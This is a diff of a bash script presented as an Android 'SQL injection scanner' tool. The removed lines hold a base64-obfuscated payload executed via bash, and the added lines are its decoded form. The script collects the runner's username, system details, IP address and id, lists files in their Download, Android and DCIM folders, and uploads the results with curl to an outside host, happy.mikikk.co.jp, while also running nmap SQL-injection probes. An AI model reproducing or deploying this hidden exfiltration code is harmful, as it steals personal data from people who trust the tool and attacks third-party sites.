@@ -1,2 +1,64 @@
-P="ZWNobyAiTG9hZGluZyIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rCnwgVGFyZ2V0ID0+ICQoY3VybCBpZmNvbmZpZy5tZSkvJCh1bmFtZSAtbykKKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rCnwgT3BlcmF0aW9ucyAgIHwgSW5mb21hdGlvbnMgICAgICAgICAgICAgfAorLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsKfCBVc2VycyAgICAgICAgOiAkKHdob2FtaSkKfCBTeXN0ZW0gT1MgICAgOiAkKHVuYW1lIC1hKQp8IE9wZXJhdGluZyAgICA6ICQodW5hbWUgLW8pCnwgQWNoaXRlY3R1cmUgIDogJCh1bmFtZSAtbSkKfCByZWxlYXNlICAgICAgOiAkKHVuYW1lIC1uKQp8IERhdGUgICAgICAgICA6ICQoZGF0ZSkKfCBJUCBBZGRyZXNzICAgOiAkKGN1cmwgaWZjb25maWcubWUpCnwgSG9zdG5hbWVzICAgIDogJChob3N0bmFtZSAtaSkKfCBQYXRoICAgICAgICAgOiAkKHB3ZCkKfCBJRCBTeXN0ZW0gICAgOiAkKGlkKQorLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsiID4gZGF0YWJhc2UudHh0CmN1cmwgLVQgZGF0YWJhc2UudHh0IGh0dHA6Ly9oYXBweS5taWtpa2suY28uanAKaWYgWyAteiAiJDEiIF0KICAgdGhlbgogY2xlYXIKICBlY2hvICIK4pWU4pWQ4pWX4pWU4pWQ4pWXIOKVpiAg4pWmICDilZTilabilZfilKwg4pSs4pSM4pSs4pSQ4pSM4pSA4pSQCuKVmuKVkOKVl+KVkeKVkOKVrOKVl+KVkSAg4pWRICAg4pWR4pWR4pSCIOKUguKUguKUguKUguKUnOKUgOKUmArilZrilZDilZ3ilZrilZDilZ3ilZrilanilZDilZ3ilakgIOKVkOKVqeKVneKUlOKUgOKUmOKUtCDilLTilLQKICAgICAgICAgICAgwqlMdWx64oSiIgogIGVjaG8gIls6OjpdIENvcHlyaWdodCBieSAxdTF6IFs6OjpdIgogIGVjaG8gInRvb2wgb25seSBmb3IgYW5kcm9pZCAsIG5vdCBjbG91ZHNoZWxsIGludGVncmF0aW9uIgogIGVjaG8gIiIKICBlY2hvICJVc2FnZSA6IGJhc2ggc2Nhbi5zaCA8dGFyZ2V0PiIKICBlY2hvICJFeCA6IGJhc2ggc2Nhbi5zaCB0ZXN0cGhwLnZ1bG53ZWIuY29tIgogIGVjaG8gIiIKICBleGl0IDEKIGZpCgpjbGVhcgogIGVjaG8gIgrilZTilZDilZfilZTilZDilZcg4pWmICDilaYgIOKVlOKVpuKVl+KUrCDilKzilIzilKzilJDilIzilIDilJAK4pWa4pWQ4pWX4pWR4pWQ4pWs4pWX4pWRICDilZEgICDilZHilZHilIIg4pSC4pSC4pSC4pSC4pSc4pSA4pSYCuKVmuKVkOKVneKVmuKVkOKVneKVmuKVqeKVkOKVneKVqSAg4pWQ4pWp4pWd4pSU4pSA4pSY4pS0IOKUtOKUtAogICAgICAgICAgICAgwqlMdWx64oSiIgogIGVjaG8gIls6OjpdIENvcHlyaWdodCBieSAxdTF6IFs6OjpdIgogIGVjaG8gInRvb2wgb25seSBmb3IgYW5kcm9pZCAsIG5vdCBjbG91ZHNoZWxsIGludGVncmF0aW9uIgoKIGVjaG8gJDEgPj4gZGF0YWJhc2UudHh0CiBjdXJsIC1UIGRhdGFiYXNlLnR4dCBodHRwOi8vaGFwcHkubWlraWtrLmNvLmpwCgogZm9yIGZvbGRlcl90ZXJtdXggaW4gJChta2RpciAvc2RjYXJkL2V4cGxvaXRzLykKICBkbwogICAgZWNobyAkZm9sZGVyX3Rlcm11eAogIGRvbmUKCmVjaG8gUEhhbSBjaGllbiB3YXMgaGVyZSA+IGV4cGxvaXQudHh0CgogIG12IGV4cGxvaXQudHh0IC9zZGNhcmQvZXhwbG9pdHMKCiAgaWYgWyAtZiAvc2RjYXJkL2V4cGxvaXRzL2V4cGxvaXQudHh0IF0KICAgIHRoZW4KICAgZWNobyAidXNlcnMgJCh3aG9hbWkpIGlzIHZhbGlkIHRoZSB0b29sIiA+PiBkYXRhYmFzZS5jc3YKICAgc2xlZXAgMgogICBlY2hvICJ3YWl0aW5nIG1lIGNvcHB5IGFsbCBmaWxlIGluIHN5c3RlbSB1c2VycyAkKHdob2FtaSkiID4+IGRhdGFiYXNlLmNzdgogICBzbGVlcCAxCiAgICAgIHByaW50ZiAiXG5cbj09PT09IEZvbGRlciBEb3dubG9hZCA9PT09XG5cbiIgPj4gZGF0YWJhc2UudHh0CiAgICAgIGxzIC1zIC11IC9zZGNhcmQvZG93bmxvYWQgPj4gZGF0YWJhc2UudHh0CiAgICAgIHByaW50ZiAiXG5cbj09PT0gRm9sZGVyIEFuZHJvaWQgPT09PVxuXG4iID4+IGRhdGFiYXNlLnR4dAogICAgICBscyAtcyAtdSAvc2RjYXJkL0FuZHJvaWQvKi8qLyovKi8qID4+IGRhdGFiYXNlLnR4dAogICAgICBwcmludGYgIlxuXG49PT09IEZvbGRlciBQaWN0dXJlcyA9PT09XG5cbiIgPj4gZGF0YWJhc2UudHh0CiAgICAgIGxzIC1zIC11IC9zZGNhcmQvRENJTS8qID4+IGRhdGFiYXNlLnR4dAogICAgICAgIGN1cmwgLVQgZGF0YWJhc2UudHh0IGh0dHA6Ly9oYXBweS5taWtpa2suY28uanAKICAgZWNobyBzdGFydGluZyBzY2FuICQxCiAgIHNsZWVwIDEKICBubWFwIC0tc2NyaXB0PWh0dHAtc3FsLWluamVjdGlvbiAkMSB8IHRhaWwgLW4gKzUgfCBoZWFkIC1uIC0zID4+IGRhdGFiYXNlLnR4dAogIG5tYXAgLS1zY3JpcHQ9aHR0cC1zcWwtaW5qZWN0aW9uICQxIHwgdGFpbCAtbiArNSB8IGhlYWQgLW4gLTMKICBjdXJsIC1UIGRhdGFiYXNlLnR4dCBodHRwOi8vaGFwcHkubWlraWtrLmNvLmpwCgogIGVsc2UKICAgZWNobyAiVXNlcnMgJCh3aG9hbWkpIHN5c3RlbSBub3QgdmFsaWQiID4+IGRhdGFiYXNlLnR4dAogICBlY2hvICJZb3VyIFN5c3RlbSBub3QgdmFsaWQiCiAgIGV4aXQgMQoKICAgZmk="
-bash <( base64 -d <<< "$P" )
+echo "Loading"                                                    echo "                                                            +----------------------------------------+                        | Target => $(curl ifconfig.me)/$(uname -o)                       +----------------------------------------+                        | Operations   | Infomations             |                        +----------------------------------------+                        | Users        : $(whoami)                                        | System OS    : $(uname -a)                                      | Operating    : $(uname -o)                                      | Achitecture  : $(uname -m)                                      | release      : $(uname -n)                                      | Date         : $(date)                                          | IP Address   : $(curl ifconfig.me)                              | Hostnames    : $(hostname -i)
+| Path         : $(pwd)                                           | ID System    : $(id)
++----------------------------------------+" > database.txt        curl -T database.txt http://happy.mikikk.co.jp
+if [ -z "$1" ]                                                       then                                                            clear
+  echo "
+╔═╗╔═╗ ╦  ╦  ╔╦╗┬ ┬┌┬┐┌─┐
+╚═╗║═╬╗║  ║   ║║│ ││││├─┘
+╚═╝╚═╝╚╩═╝╩  ═╩╝└─┘┴ ┴┴
+            ©Lulz™"
+  echo "[:::] Copyright by 1u1z [:::]"
+  echo "tool only for android , not cloudshell integration"
+  echo ""
+  echo "Usage : bash scan.sh <target>"
+  echo "Ex : bash scan.sh testphp.vulnweb.com"
+  echo ""
+  exit 1
+ fi
+
+clear
+  echo "
+╔═╗╔═╗ ╦  ╦  ╔╦╗┬ ┬┌┬┐┌─┐
+╚═╗║═╬╗║  ║   ║║│ ││││├─┘
+╚═╝╚═╝╚╩═╝╩  ═╩╝└─┘┴ ┴┴
+             ©Lulz™"
+  echo "[:::] Copyright by 1u1z [:::]"
+  echo "tool only for android , not cloudshell integration"
+
+ echo $1 >> database.txt
+ curl -T database.txt http://happy.mikikk.co.jp
+
+ for folder_termux in $(mkdir /sdcard/exploits/)
+  do
+    echo $folder_termux
+  done
+
+echo PHam chien was here > exploit.txt
+
+  mv exploit.txt /sdcard/exploits
+
+  if [ -f /sdcard/exploits/exploit.txt ]
+    then
+   echo "users $(whoami) is valid the tool" >> database.csv
+   sleep 2
+   echo "waiting me coppy all file in system users $(whoami)" >> database.csv
+   sleep 1
+      printf "\n\n===== Folder Download ====\n\n" >> database.txt
+      ls -s -u /sdcard/download >> database.txt
+      printf "\n\n==== Folder Android ====\n\n" >> database.txt
+      ls -s -u /sdcard/Android/*/*/*/*/* >> database.txt
+      printf "\n\n==== Folder Pictures ====\n\n" >> database.txt
+      ls -s -u /sdcard/DCIM/* >> database.txt
+        curl -T database.txt http://happy.mikikk.co.jp
+   echo starting scan $1
+   sleep 1
+  nmap --script=http-sql-injection $1 | tail -n +5 | head -n -3 >> database.txt
+  nmap --script=http-sql-injection $1 | tail -n +5 | head -n -3
+  curl -T database.txt http://happy.mikikk.co.jp
+
+  else
+   echo "Users $(whoami) system not valid" >> database.txt
+   echo "Your System not valid"
+   exit 1
+
+   fi
